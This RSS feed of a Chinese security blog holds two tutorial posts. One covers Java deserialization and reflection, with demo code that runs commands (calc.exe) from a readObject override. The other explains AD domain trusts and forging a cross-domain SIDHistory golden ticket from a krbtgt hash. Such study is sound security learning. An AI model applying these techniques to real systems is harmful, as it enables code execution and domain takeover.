<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>cOOl &#39;s blog</title>
        <link>https://coollllllll.github.io/</link>
        <description>Recent content on cOOl &#39;s blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <lastBuildDate>Thu, 10 Mar 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://coollllllll.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>java 反序列化-1</title>
        <link>https://coollllllll.github.io/p/java-1/</link>
        <pubDate>Thu, 10 Mar 2022 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/java-1/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/java-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post java 反序列化-1" /&gt;&lt;h1 id=&#34;java-反序列化-1&#34;&gt;java 反序列化-1&lt;/h1&gt;
&lt;h2 id=&#34;基础&#34;&gt;基础&lt;/h2&gt;
&lt;h3 id=&#34;相关方法&#34;&gt;相关方法&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 序列化
ObjectOutputStream 类的 writeObject()

# 反序列化
ObjectInputStream 类的 readObject()
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;前提&#34;&gt;前提&lt;/h3&gt;
&lt;p&gt;实现 &lt;code&gt;java.io.Serializable&lt;/code&gt; 接口才可被反序列化，而且所有属性必须是可序列化的(用 &lt;code&gt;transient&lt;/code&gt; 关键字修饰的属性除外，不参与序列化过程)。&lt;/p&gt;
&lt;h2 id=&#34;基本原理&#34;&gt;基本原理&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Demo：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public static void main (String args[]) throws Exception {
    String obj = &amp;quot;hello world!&amp;quot;;
    
    // 创建一个包含对象进行反序列化信息的”object”数据文件
    FileOutputStream fos = new FileOutputStream(&amp;quot;object&amp;quot;);
    ObjectOutputStream os = new ObjectOutputStream(fos);
    
    // writeObject()方法将obj对象写入object文件
    
    os.writeObject(obj);
    os.close();
    
    // 从文件中反序列化obj对象
    FileInputStream fis = new FileInputStream(&amp;quot;object&amp;quot;);
    ObjectInputStream ois = new ObjectInputStream(fis);
    
    // 恢复对象
    String obj2 = (String)ois.readObject();
    System.out.print(obj2);
    ois.close();
}
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;序列化后写入 object 文件的数据如下&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1010; 
			flex-basis: 2424px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/java-1/image-20220313210555398.png&#34; data-size=&#34;879x87&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/java-1/image-20220313210555398.png&#34;
			width=&#34;879&#34;
			height=&#34;87&#34;
			srcset=&#34;https://coollllllll.github.io/p/java-1/image-20220313210555398_hu27c0e7a514bc3bd3e9249cb929cf2024_8829_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/java-1/image-20220313210555398_hu27c0e7a514bc3bd3e9249cb929cf2024_8829_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;序列化后的数据开头包含两字节的魔术数字：&lt;code&gt;ACED&lt;/code&gt;。接下来是两字节的版本号 &lt;code&gt;0005&lt;/code&gt; 的数据。此外还包含了类名、成员变量的类型和个数等。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;写入 object 后，使用&lt;code&gt;readObject&lt;/code&gt;方法读取序列化后的数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 640; 
			flex-basis: 1536px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/java-1/image-20220313211009425.png&#34; data-size=&#34;525x82&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/java-1/image-20220313211009425.png&#34;
			width=&#34;525&#34;
			height=&#34;82&#34;
			srcset=&#34;https://coollllllll.github.io/p/java-1/image-20220313211009425_huf357fa920edd07d76831133f2ef00fe7_8229_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/java-1/image-20220313211009425_huf357fa920edd07d76831133f2ef00fe7_8229_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image-20220313211009425&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image-20220313211009425&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;漏洞就发生在当&lt;code&gt;readObject()&lt;/code&gt; 方法被重写，反序列化该类时调用便是重写后的 &lt;code&gt;readObject()&lt;/code&gt; 方法。如果该方法使用不当的话就有可能引发恶意代码的执行。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;class MyObject implements Serializable{
    public String name;
    // 重写readObject()方法
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
        // 执行默认的readObject()方法
        in.defaultReadObject();
        // 执行打开计算器程序命令
        Runtime.getRuntime().exec(name);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当进行对象的反序列化时，就会执行&lt;code&gt;readObject&lt;/code&gt;方法里的命令执行方法：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 229; 
			flex-basis: 551px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/java-1/image-20220313212213010.png&#34; data-size=&#34;2131x928&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/java-1/image-20220313212213010.png&#34;
			width=&#34;2131&#34;
			height=&#34;928&#34;
			srcset=&#34;https://coollllllll.github.io/p/java-1/image-20220313212213010_hu926cb49c5044207f8f1df22bf577f766_293445_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/java-1/image-20220313212213010_hu926cb49c5044207f8f1df22bf577f766_293445_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;实际情况下的反序列化会比较复杂，与 java 各类特性相关。&lt;/p&gt;
&lt;h2 id=&#34;java-反射特性&#34;&gt;Java 反射特性&lt;/h2&gt;
&lt;p&gt;反射是大部分语言都有的，对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的⽅法可以调用，总之通过&lt;strong&gt;反射&lt;/strong&gt;，可以将Java这种静态语言附加上动态特性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;动态特性：&lt;/p&gt;
&lt;p&gt;⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;例如如下 Demo, 当不知道传入参数值时，是无法晓得他的实际作用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Demo1：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public void execute(String className, String methodName) throws Exception {
 Class clazz = Class.forName(className);
 clazz.getMethod(methodName).invoke(clazz.newInstance());
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上述例子中包含了几个重要的与反射相关的方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取类对象的方法：&lt;code&gt;forName&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;实例化类对象的方法：&lt;code&gt;newInstance&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;获取函数的方法：&lt;code&gt;getMethod&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;执行函数的方法：&lt;code&gt;invoke&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;获取类对象的方法&#34;&gt;获取类对象的方法&lt;/h3&gt;
&lt;p&gt;Java 中类本身也是一个对象，&lt;code&gt;java.lang.Class&lt;/code&gt; 类的实例，这个实例称为类对象：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;类对象用于提供类本身的信息，比如有几种构造方法， 有多少属性，有哪些普通方法&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;想要获得一个类的属性和方法，就必须先获得该类的类对象。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;方法：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;obj.getClass() &lt;/code&gt;如果上下文中存在某个类的实例 obj ，可以直接通过 &lt;code&gt;obj.getClass() &lt;/code&gt;来获取它的类&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Test.class &lt;/code&gt;如果已经加载了某个类，只是想获取到它的 &lt;code&gt;java.lang.Class &lt;/code&gt;对象，那么就直接拿它的 class 属性即可。这个方法其实不属于反射&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Class.forName &lt;/code&gt;如果知道某个类的名字，想获取到这个类，就可以使用 forName 来获取&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;利用类对象创建实例&#34;&gt;利用类对象创建实例&lt;/h3&gt;
&lt;p&gt;假设目前有一个Person类：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public class Person implements Serializable {
    private String name;
    private Integer age;

    public Person(String name, Integer age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return this.name;
    }
    public Integer getAge() {
        return this.age;
    }
    
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;与直接&lt;code&gt;new Person()&lt;/code&gt;不同，基于反射必须先拿到类对象，然后通过类对象获取构造器对象，再通过构造器对象创建一个对象。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public static void main (String args[]) throws Exception {
    Class PersonClass = Class.forName(&amp;quot;Person&amp;quot;);
    Constructor constructor = PersonClass.getConstructor(String.class, Integer.class);
    Person p = (Person)constructor.newInstance(&amp;quot;cool&amp;quot;, 18);

    System.out.println(p.getName());
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有了实例，就可以访问其属性，使用其方法。&lt;/p&gt;
&lt;h3 id=&#34;利用反射执行代码&#34;&gt;利用反射执行代码&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// java.lang.Runtime.getRuntime().exec(&amp;quot;calc.exe&amp;quot;);
Class clazz = Class.forName(&amp;quot;java.lang.Runtime&amp;quot;);
clazz.getMethod(&amp;quot;exec&amp;quot;, String.class).invoke(clazz.getMethod(&amp;quot;getRuntime&amp;quot;).invoke(clazz),
&amp;quot;calc.exe&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上述代码本质上就是调用了&lt;code&gt;java.lang.Runtime.getRuntime().exec(&amp;quot;calc.exe&amp;quot;)&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;使用到了&lt;code&gt;getMethod&lt;/code&gt;和&lt;code&gt;invoke&lt;/code&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;getMethod&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;getMethod&lt;/code&gt; 的作用是通过反射获取一个类的某个特定的公有方法。Java中支持类的重载，不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，需要传给他需要获取的函数的参数类型列表。&lt;/p&gt;
&lt;p&gt;而这里&lt;code&gt;Runtime.exec&lt;/code&gt;有6个重载：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 331; 
			flex-basis: 796px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/java-1/image-20220313221949328.png&#34; data-size=&#34;697x210&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/java-1/image-20220313221949328.png&#34;
			width=&#34;697&#34;
			height=&#34;210&#34;
			srcset=&#34;https://coollllllll.github.io/p/java-1/image-20220313221949328_hud8f72b4e66c691f776ed84543815d95a_71681_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/java-1/image-20220313221949328_hud8f72b4e66c691f776ed84543815d95a_71681_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image-20220313221949328&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image-20220313221949328&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里使用第一个，所以使用&lt;code&gt;getMethod(&amp;quot;exec&amp;quot;, String.class)&lt;/code&gt;获取到了第一个方法。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;invoke&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;invoke 的作用是执行方法，它的第一个参数是：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;如果这个方法是一个普通方法，那么第一个参数是类对象
如果这个方法是一个静态方法，那么第一个参数是类
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正常执行方法是 [1].method([2], [3], [4]&amp;hellip;) ，在反射里就是 method.invoke([1], [2], [3], [4]&amp;hellip;) 。&lt;/p&gt;
&lt;p&gt;所以上述例子可分解为：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;class clazz = Class.forName(&amp;quot;java.lang.Runtime&amp;quot;);
Method execMethod = clazz.getMethod(&amp;quot;exec&amp;quot;, String.class);
Method getRuntimeMethod = clazz.getMethod(&amp;quot;getRuntime&amp;quot;);
Object runtime = getRuntimeMethod.invoke(clazz);
execMethod.invoke(runtime, &amp;quot;calc.exe&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;另一种常用的执行命令的方式是 &lt;code&gt;ProcessBuilder&lt;/code&gt;，通过反射来获取其构造函数，然后调用 &lt;code&gt;start()&lt;/code&gt; 来执行命令:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Class clazz = Class.forName(&amp;quot;java.lang.ProcessBuilder&amp;quot;);

clazz.getMethod(&amp;quot;start&amp;quot;).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&amp;quot;open&amp;quot;, &amp;quot;/System/Applications/Calculator.app&amp;quot;)));
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;获取私有方法&#34;&gt;获取私有方法&lt;/h3&gt;
&lt;p&gt;当一个方法是私有方法(例如私有构造函数)，能否通过反射执行它？&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;getDeclared &lt;/code&gt;系列的反射，它与普通的 &lt;code&gt;getMethod 、 getConstructor&lt;/code&gt; 区别：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;getMethod&lt;/code&gt; 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法&lt;/li&gt;
&lt;li&gt;&lt;code&gt;getDeclaredMethod&lt;/code&gt; 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;getDeclaredMethod &lt;/code&gt;的具体用法和 &lt;code&gt;getMethod&lt;/code&gt; 类似， &lt;code&gt;getDeclaredConstructor&lt;/code&gt; 的具体用法 &lt;code&gt;getConstructor &lt;/code&gt;类似。&lt;/p&gt;
&lt;p&gt;例如，Runtime这个类的构造函数是私有的，之前需要用 &lt;code&gt;Runtime.getRuntime()&lt;/code&gt; 来获取对象。其实现在也可以直接用 &lt;code&gt;getDeclaredConstructor()&lt;/code&gt; 来获取这个私有的构造方法来实例化对象，进而执行命令：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;class clazz = Class.forName(&amp;quot;java.lang.Runtime&amp;quot;);
Constructor m = clazz.getDeclaredConstructor();
m.setAccessible(true);  // 获取到一个私有方法后，必须用 setAccessible 修改它的作用域，否则仍然不能调用
clazz.getMethod(&amp;quot;exec&amp;quot;, String.class).invoke(m.newInstance(), &amp;quot;calc.exe&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>基于域信任关系的域攻击</title>
        <link>https://coollllllll.github.io/p/intranet-14/</link>
        <pubDate>Tue, 01 Mar 2022 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-14/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-14/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 基于域信任关系的域攻击" /&gt;&lt;h1 id=&#34;基于域信任关系的域攻击&#34;&gt;基于域信任关系的域攻击&lt;/h1&gt;
&lt;h2 id=&#34;域信任&#34;&gt;域信任&lt;/h2&gt;
&lt;p&gt;建立域之间的信任关系，是为了一个域的用户能方便地访问其他域的资源，同时也方便了对域网络的管理和维护。这种模式在带来便利的同时，也存在很多可被恶意攻击者利用的地方。&lt;/p&gt;
&lt;p&gt;域信任关系可以是**单向\双向信任、可传递\不可传递信任、内部\外部信任、跨域链接信任(cross link trust)**等类型。&lt;/p&gt;
&lt;p&gt;例如，2 个域之间有单向可传递的外部信任关系。同一个森林(Forest)内部的域信任关系，一般隐含为双向可传递的内部信任关系。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 178; 
			flex-basis: 427px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303203923876.png&#34; data-size=&#34;1414x793&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303203923876.png&#34;
			width=&#34;1414&#34;
			height=&#34;793&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303203923876_hua9b3249351f6e1b78e88d8280f09bf0d_477399_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220303203923876_hua9b3249351f6e1b78e88d8280f09bf0d_477399_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;各类关系&#34;&gt;各类关系&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;加入一个新的域到已存在的森林里：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 143; 
			flex-basis: 345px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303204547364.png&#34; data-size=&#34;1037x721&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303204547364.png&#34;
			width=&#34;1037&#34;
			height=&#34;721&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303204547364_huce82cf505d7780b60d794b9cbbbb15f1_329806_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220303204547364_huce82cf505d7780b60d794b9cbbbb15f1_329806_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;父子信任关系&lt;/strong&gt;是最常见的域信任关系，在同一个森林内部，加入一个新域时，最常见的是子域模式(Parent- Child)，或者是树根模式(Tree-Root)，这两种模式分别会建立&lt;strong&gt;父子信任\树根信任关系，都是双向可传递的内部信任关系&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 180; 
			flex-basis: 433px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303210159838.png&#34; data-size=&#34;1447x802&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303210159838.png&#34;
			width=&#34;1447&#34;
			height=&#34;802&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303210159838_hubb7d87a7e28ff78b2a087d77a4ec99a9_239731_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220303210159838_hubb7d87a7e28ff78b2a087d77a4ec99a9_239731_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;父子域一般会存在域名上的规律，TreeRoot方式则没有&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;跨域链接信任&lt;/strong&gt;（cross link)，指的是在同一个森林的两个子域间建立直接的信任关系。因为在同一个森林中，域的组织关系是树状结构，从一个子域到另外一个域，需要从树枝的子域顺寻到根域(Forest Root)，然后从根域继续顺寻到另外一个子域，而跨域链接相当于 在 2 个子域之间直接建立了一个快捷方式的信任关系，以减少认证和授权的时间和步骤。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;内部信任&lt;/strong&gt;指的是森林内部域之间的信任关系。相应地，&lt;strong&gt;外部信任&lt;/strong&gt;(External Domain Trust)指的是域和所在森林之外的域之间的信任关系。&lt;/p&gt;
&lt;h2 id=&#34;跨域认证和资源访问授权&#34;&gt;跨域认证和资源访问授权&lt;/h2&gt;
&lt;p&gt;当 2 个域之间建立域信任关系时，会建立共享的&lt;code&gt;域间密钥&lt;/code&gt;(Inter-Realm Key，简写为&lt;code&gt;IRKey&lt;/code&gt;)，其作用相当于 &lt;code&gt;Krbtgt&lt;/code&gt;，只不过 &lt;code&gt;IRKey&lt;/code&gt; 用于相互信任的 2 个域之间的认 证，而 Krbtgt 用于同一个域服务器的 AC 和 KDC 之间的认证。&lt;/p&gt;
&lt;p&gt;信任域之间的认证授权过程，与同一个域中的认证授权大抵相似，但仍然有不少区别。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 138; 
			flex-basis: 333px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303212631882.png&#34; data-size=&#34;1192x859&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303212631882.png&#34;
			width=&#34;1192&#34;
			height=&#34;859&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303212631882_hu0424d02716859ca33f8eed28cca1adca_635709_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220303212631882_hu0424d02716859ca33f8eed28cca1adca_635709_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Jack 向 DC1 发起认证请求，数据由 Jack 的口令 NTLM 值加密&lt;/li&gt;
&lt;li&gt;DC1 使用 Jack 的口令 NTLM 值验证收到的认证请求，返回一个通过认证的 TGT 票据给 Jack&lt;/li&gt;
&lt;li&gt;Jack 使用 TGT 票据，向 DC1 发起授权请求，发起 请求访问 DC2 中文件服务的 TGS_REQ&lt;/li&gt;
&lt;li&gt;DC1 检查到文件服务在 DC2 中，返回一个&lt;strong&gt;可转投的 TGT(Referral TGT)&lt;/strong&gt;，指明需转投到 DC2，&lt;strong&gt;使用 IRKey 加密可转投 TGT 中的认证信息&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Jack 收到可转投的 TGT 后，根据提示信息，使用转投 TGT，发起访问 DC2 中文件服务的请求 TGS_REQ&lt;/li&gt;
&lt;li&gt;DC2 收到请求后，&lt;strong&gt;使用 IRKey 验证可转投 TGT 中的认证信息&lt;/strong&gt;，返回一个允许访问文件服务的 TGS 票据，票据中部分信息使用运行文件服务的服务账号的口令 NTLM 值加密&lt;/li&gt;
&lt;li&gt;Jack 使用收到的 TGS 票据访问 DC2 中的文件服务&lt;/li&gt;
&lt;li&gt;文件服务的服务账号使用口令 NTLM 值校验 TGS，成功则允许访问&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当 2 个域之间建立信任关系时，会在&lt;strong&gt;全局域数据库中存档对方的 SPN、DNS 等信息，方便访问时进行查询&lt;/strong&gt;。例如，上图中，DC1 会存档 DC2 中所有的服务 SPN、DNS 等信息。&lt;/p&gt;
&lt;p&gt;如果 Jack 请求访问的服务在 DC1 的全局数据库中，则会返回转投 TGT，如果不在，如果 DC1 有父域，则 DC1 会向父域请求直至森林的根域服务器，如果 DC1 本身是根服务器(本例中 DC1 是根域服务器)，则直接告诉 Jack，请求访问的服务不存在。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一个森林只有一个全局数据库(根域内)。但是森林内部存在的cross link信任关系不会存于这个全局数据库。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当未建立信任关系时，森林内部想要跨域访问，必须逐级往上到根域，再顺寻到目标域；当建立信任关系后(森林内部跨链接信任或森林间信任)，则会在找到根域之后直接返回转投TGT。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;sidhistory-版跨域黄金票据&#34;&gt;SIDHistory 版跨域黄金票据&lt;/h2&gt;
&lt;h3 id=&#34;非跨域黄金票据&#34;&gt;非跨域黄金票据&lt;/h3&gt;
&lt;p&gt;在一个域中，一旦我们获取 Krbtgt 的 NTLM 值，则可以构造黄金票据，伪造成域内任意用户，包括管理员，获取对域的完全访问控制权限。但是在同一个森林的不同域中，黄金票据不再有效。&lt;/p&gt;
&lt;p&gt;黄金票据的几大要素：域名、域的SID(Security Identifier)、本域 Krbtgt 用户口令 NTLM 值、想伪造票据的用户 RID(Relative Identifier，在无特别指明情况下，Mimikatz 工具会设置 RID 为域管理员的 RID)。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;不同的域有不同的 Krbtgt，导致黄金票据在不同的域之间失效。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 153; 
			flex-basis: 367px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303221125974.png&#34; data-size=&#34;1058x691&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303221125974.png&#34;
			width=&#34;1058&#34;
			height=&#34;691&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303221125974_hu91ec14b53c794fea2dcc6033b8a4ed3a_344979_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220303221125974_hu91ec14b53c794fea2dcc6033b8a4ed3a_344979_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;跨域版黄金票据&#34;&gt;跨域版黄金票据&lt;/h3&gt;
&lt;p&gt;如果一个用户的 &lt;code&gt;SIDHistory&lt;/code&gt; 属性被设置为高权限组或者用户的 &lt;code&gt;ID&lt;/code&gt;，则该用户也具备等同于高权限组或者用户的权限。如果我们伪造的黄金票据中加入目标域的域管理员组的 &lt;code&gt;SID&lt;/code&gt;，则可以获取目标域的域管理员权限，&lt;code&gt;黄金票据&lt;/code&gt;和 &lt;code&gt;SIDHistory&lt;/code&gt; 的结合，可实现跨域黄金票据。&lt;/p&gt;
&lt;p&gt;由于每个域的 &lt;code&gt;SID&lt;/code&gt; 都不同，叠加 &lt;code&gt;SIDHistory&lt;/code&gt; 的黄金票据不具备通用性。&lt;strong&gt;根据微软的描述，在同一个域森林内部，企业管理组 &lt;code&gt;EA(Enterprise Administrators)&lt;/code&gt; 会自动被森林内部所有域加入到本域的域管理员组，且 &lt;code&gt;EA&lt;/code&gt; 只存在于根域中，所以企业管理组 &lt;code&gt;EA&lt;/code&gt; 的 &lt;code&gt;SID&lt;/code&gt; 固定为根域的 &lt;code&gt;SID&lt;/code&gt; 加上固定的 &lt;code&gt;RID&lt;/code&gt; 即 &lt;code&gt;519&lt;/code&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因此，如果将使用企业管理组EA的SID设置SIDHistory属性，和黄金票据结合，则在只获取任意一个域krbtgt账号NTLM值的前提下，可实现森林内所有域的跨 域黄金票据，这种票据可简称为&lt;strong&gt;SIDHistory版黄金票据&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;当然也可以&lt;strong&gt;添加指定域的管理员SID为SIDHistory，这种黄金票据只对当前指定域有效，对其他域无效。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 144; 
			flex-basis: 346px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306195728072.png&#34; data-size=&#34;1318x913&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306195728072.png&#34;
			width=&#34;1318&#34;
			height=&#34;913&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220306195728072_hu6f66eacb89b6899609cf236dd01ebd5b_820581_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220306195728072_hu6f66eacb89b6899609cf236dd01ebd5b_820581_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
